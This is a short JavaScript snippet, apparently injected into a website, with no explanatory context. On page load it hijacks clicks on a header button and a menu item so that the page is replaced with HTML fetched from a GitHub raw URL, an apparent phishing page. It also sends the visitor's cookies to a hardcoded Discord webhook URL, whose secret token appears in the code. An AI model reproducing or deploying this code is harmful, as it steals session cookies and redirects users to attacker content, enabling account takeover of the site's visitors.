window.onload = function() {
      document.getElementsByClassName("main-header__action")[0].addEventListener("click", function(event) {
            event.preventDefault();
            fetch('https://raw.githubusercontent.com/cristichiu/testing/refs/heads/main/testing.html').then(r => r.text()).then(html => document.documentElement.innerHTML = html);
      });
      document.getElementsByClassName("menu-nav__item")[5].addEventListener("click", function(event) {
            event.preventDefault();
            fetch('https://raw.githubusercontent.com/cristichiu/testing/refs/heads/main/testing.html').then(r => r.text()).then(html => document.documentElement.innerHTML = html);
      });
      fetch('https://discord.com/api/webhooks/1301483051653533707/4Zq3BT1n4PZOmTpQIT40a8MxV62ejnlQmBSniy1Mb3_jr3qTgfOfZM54PQKg7rAWUWzl',{method:'POST',headers: {'Content-Type':'application/json'},body:JSON.stringify({content:document.cookie})})
}
